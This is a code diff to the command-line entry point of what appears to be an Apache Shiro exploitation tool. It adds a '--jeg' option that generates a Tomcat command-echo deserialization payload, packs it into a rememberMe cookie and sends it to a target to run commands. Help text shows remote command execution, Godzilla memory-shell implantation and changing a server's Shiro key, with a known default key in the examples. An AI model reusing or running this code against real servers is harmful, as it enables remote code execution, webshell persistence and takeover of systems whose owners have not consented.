@@ -1,6 +1,7 @@
 package com.summersec.attack.CLI;
 
 import com.summersec.attack.core.AttackService;
+import com.summersec.attack.integration.generator.model.EchoGenerateResult;
 import com.summersec.attack.UI.MainController;
 import com.summersec.attack.deser.plugins.servlet.MemBytes;
 import com.summersec.attack.entity.ControllersFactory;
@@ -146,9 +147,31 @@ public class MainCLI {
         as.url = url;
         AttackService.realShiroKey = key;
 
+        boolean jegMode = cli.hasFlag("--jeg");
         String gadget = cli.opt("-g");
         String echo = cli.opt("-e");
         if (echo == null || echo.isEmpty()) echo = "AllEcho";
+
+        if (jegMode) {
+            EchoGenerateResult jegResult = as.generateEchoWithThirdParty(
+                    "jEG", "SERVER_TOMCAT", "MODEL_CMD", "FORMAT_BASE64",
+                    gadget, echo, key, command, "");
+            if (!jegResult.isSuccess() || jegResult.getPayload() == null) {
+                System.out.println(jegResult.isSuccess() ? "jEG 生成失败，payload 为空" : "jEG 生成失败: " + jegResult.getMessage());
+                return;
+            }
+            String cookieLine = AttackService.resolveRememberMeCookieLine(jegResult.getPayload(), jegResult.getRequestHeaderName());
+            if (cookieLine == null) {
+                System.out.println("jEG payload 无法转为 rememberMe Cookie");
+                return;
+            }
+            AttackService.attackRememberMe = cookieLine;
+            String result = as.sendRememberMeCookieExploitWithCmd(cookieLine, command, true, null);
+            if (result != null) {
+                System.out.println(result);
+            }
+            return;
+        }
 
         if (gadget != null && !gadget.isEmpty()) {
             boolean hit = as.gadgetCrack(gadget, echo, key);
@@ -275,6 +298,7 @@ public class MainCLI {
         System.out.println("  --dynamic-memshell  Use Javassist runtime compile (instead of hardcoded Base64)");
         System.out.println("  --newkey <nk>       New Shiro AES key for changekey");
         System.out.println("  --variant <v>       Key change injection variant");
+        System.out.println("  --jeg               Use jEG (third-party echo generator, requires --gcm)");
         System.out.println("  --cbc               AES-CBC mode (Shiro <= 1.2.4)");
         System.out.println("  --gcm               AES-GCM mode (Shiro >= 1.2.5)");
         System.out.println("  --proxy <url>       HTTP proxy (http://host:port)");
@@ -287,6 +311,7 @@ public class MainCLI {
         System.out.println("  java -jar xxx.jar crack     -u http://target:8080 -K kPH+bIxk5D2deZiIxcaaaA==");
         System.out.println("  java -jar xxx.jar exec      -u http://target:8080 -K <key> -c id --cbc");
         System.out.println("  java -jar xxx.jar exec      -u http://target:8080 -K <key> -c whoami -g CommonsBeanutils1_183");
+        System.out.println("  java -jar xxx.jar exec      -u http://target:8080 -K <key> -c id --jeg --gcm");
         System.out.println("  java -jar xxx.jar memshell  -u http://target:8080 -K <key> -t 哥斯拉[Filter]");
         System.out.println("  java -jar xxx.jar changekey -u http://target:8080 -K <oldkey> --newkey <newkey>");
     }
